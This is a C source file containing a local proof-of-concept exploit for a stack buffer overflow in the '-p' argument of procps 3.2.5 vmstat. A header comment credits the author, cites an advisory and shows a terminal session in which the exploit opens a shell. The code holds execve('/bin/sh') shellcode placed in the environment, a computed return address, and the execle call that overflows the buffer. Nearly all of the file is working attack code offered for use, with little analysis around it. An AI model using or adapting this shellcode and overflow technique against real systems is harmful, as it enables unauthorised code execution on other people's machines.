/*
VULNERABLE PROGRAM:
--=[ procps 3.2.5 vmstat '-p' argument stack overflow
--=[ http://procps.sourceforge.net/
--=[ Advisory: http://www.danitrous.org/code/PoCs/vmstat_adv.txt

EXPLOIT:
--=[ Local env exploit [no suid] by nitrous <nitrous@danitrous.org>
--=[ Tested on Ubuntu Linux 2.6.8.1-3-386

nitrous@blackb0x:~/vuln-dev/nitrous/XPLOITS $ gcc vmstat-p0c.c -o vmstat-p0c
nitrous@blackb0x:~/vuln-dev/nitrous/XPLOITS $ ./vmstat-p0c
-=[ Jumping to: 0xbfffffc9

Partition was not found
sh-2.05b$ id
uid=1000(nitrous) gid=1000(nitrous)

--=[ greets to www.vulnfact.com, dr_fdisk^, CRAc, beck, ran, dymitri,
dex, benn, cryogen, JSS... blah blah blah.
*/

#include<stdio.h>
#include<string.h>

#define BUFFER_SIZE 32
#define VMSTAT_PATH "/usr/bin/vmstat"

char nitrous_egg[]=
"\xeb\x14\x5b\x31\xd2\x88\x53\x07"
"\x89\x5b\x08\x89\x53\x0c\x8d\x4b"
"\x08\x6a\x0b\x58\xcd\x80\xe8\xe7"
"\xff\xff\xff/bin/sh"; //jmp-call execve()

int main()
{
char *payl0ad= (char *)malloc(BUFFER_SIZE);
char *envir0n[2]= {nitrous_egg,NULL};

unsigned long retaddr=0xbffffffa-strlen(nitrous_egg)-strlen(VMSTAT_PATH);

printf("-=[ Jumping to: 0x%x\n\n", retaddr);

int x;
for(x=0; x<BUFFER_SIZE; x+=4)
*(unsigned long *)&payl0ad[x]= retaddr;

execle(VMSTAT_PATH, VMSTAT_PATH,"-p", payl0ad, NULL, envir0n);

return 0;
}
